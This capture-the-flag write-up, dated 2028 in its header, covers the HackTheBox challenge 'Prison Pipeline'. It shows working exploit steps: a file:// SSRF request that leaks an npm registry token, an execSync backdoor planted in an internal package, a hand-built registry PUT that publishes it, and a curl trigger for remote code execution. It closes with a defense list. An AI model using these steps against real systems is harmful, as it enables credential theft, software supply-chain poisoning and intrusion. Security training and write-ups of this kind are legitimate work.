---
layout: post
title: "Prison Pipeline"
date: 2028-05-02 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, supply-chain, npm, verdaccio, ssrf, dependency-confusion, rce, cwe-829]
description: "An SSRF leaks a private npm registry token, and publishing a backdoored package to that registry gets it auto-installed by a cron job — a supply-chain RCE that ends in a SUID-root flag read."
---

## Overview

Prison Pipeline is a Medium HackTheBox Misc challenge built around a Node.js supply-chain attack. An [SSRF](https://cwe.mitre.org/data/definitions/918.html) leaks the token for a self-hosted private npm registry, and publishing a backdoored version of an internal package gets it [auto-installed](https://cwe.mitre.org/data/definitions/829.html) by a cron job — giving remote code execution and, through a SUID-root helper, the flag.

## The setup

A Node/Express app sits behind nginx. nginx routes by Host header: `registry.prison-pipeline.htb` goes to a self-hosted **Verdaccio** private npm registry, everything else to the app. The app depends on an internal package `prisoner-db@^1.0.0` — a *floating* semver range — and a background cron runs every 30 seconds:

```bash
npm --registry http://localhost:4873 outdated prisoner-db
# if newer -> npm update prisoner-db && pm2 restart prison-pipeline
```

`/readflag` is a SUID-root binary that cats `/root/flag`, so any code execution as the app user reads the flag.

## Step 1 — SSRF leaks the registry token

`prisoner-db`'s `importPrisoner(url)` fetches a URL with **node-libcurl** and stores the body as a prisoner record whose id is returned. node-libcurl honours `file://`:

```bash
curl -X POST http://<target>/api/prisoners/import \
  -H 'Content-Type: application/json' -d '{"url":"file:///home/node/.npmrc"}'
# -> {"prisoner_id":"PIP-xxxxxx"}
curl http://<target>/api/prisoners/PIP-xxxxxx
# -> raw: //localhost:4873/:_authToken="MWZlMmI1...=="
```

That token is baked into the image at build time, so it's identical on every instance restart.

## Step 2 — Publish a backdoored package

Add a `PWN:` command handler at the top of `importPrisoner`:

```javascript
async importPrisoner(url) {
    try {
        if (typeof url === 'string' && url.startsWith('PWN:')) {
            const cp = require('child_process');
            return cp.execSync(url.slice(4)).toString();
        }
    } catch (e) { return 'PWN_ERR:' + e.toString(); }
    // ...original code
}
```

Bump `package.json` to `1.0.1` so it beats the installed `1.0.0` under `^1.0.0`. Publishing must reach Verdaccio *through nginx*. `npm publish` needs the vhost to resolve (a root-only `/etc/hosts` edit), so instead do the registry PUT manually — connect to the target IP but set the `Host` header:

```python
requests.put(f"http://{IP}:{PORT}/prisoner-db",
    headers={"Host": f"registry.prison-pipeline.htb:{PORT}", "Authorization": "Bearer "+TOKEN,
             "Content-Type": "application/json"},
    data=json.dumps({
        "_id":"prisoner-db","name":"prisoner-db","dist-tags":{"latest":"1.0.1"},
        "versions":{"1.0.1": {**package_json, "_id":"prisoner-db@1.0.1",
            "dist":{"shasum":sha1,"integrity":integrity,"tarball":tarball_url}}},
        "_attachments":{"prisoner-db-1.0.1.tgz":{"content_type":"application/octet-stream",
            "data": base64_tarball, "length": len(tgz)}}}))
# -> 201 {"ok":"created new package","success":true}
```

## Step 3 — Cron installs it, then trigger RCE

Within ~30 seconds the cron runs `npm update prisoner-db` and pm2 restarts the app with the backdoor loaded. The import route returns the helper's value as `prisoner_id`:

```bash
curl -X POST http://<target>/api/prisoners/import \
  -H 'Content-Type: application/json' -d '{"url":"PWN:/readflag"}'
# -> {"prisoner_id":"HTB{...}"}
```

Because the instance is short-lived and boots slowly, run the whole publish → wait → trigger sequence in one process and poll `PWN:/readflag` every 15s until the flag appears.

## Why it worked

A floating dependency range plus an automatic `npm update` loop plus a reachable private registry means anyone who can publish controls what the app runs. The SSRF `file://` read handed over the one thing needed to publish — the registry token — and the token being baked into the image made it reliable across restarts.

## Fix / defense

- Pin exact dependency versions (no `^`/`~`) and disable auto-update in production; require signed/provenance-verified packages.
- Lock the registry down: no anonymous publish, short-lived scoped tokens, never bake a publish token into the image or a readable `.npmrc`.
- Restrict the server-side HTTP client to http(s) only — block `file://`, `gopher://`, `ftp://`.
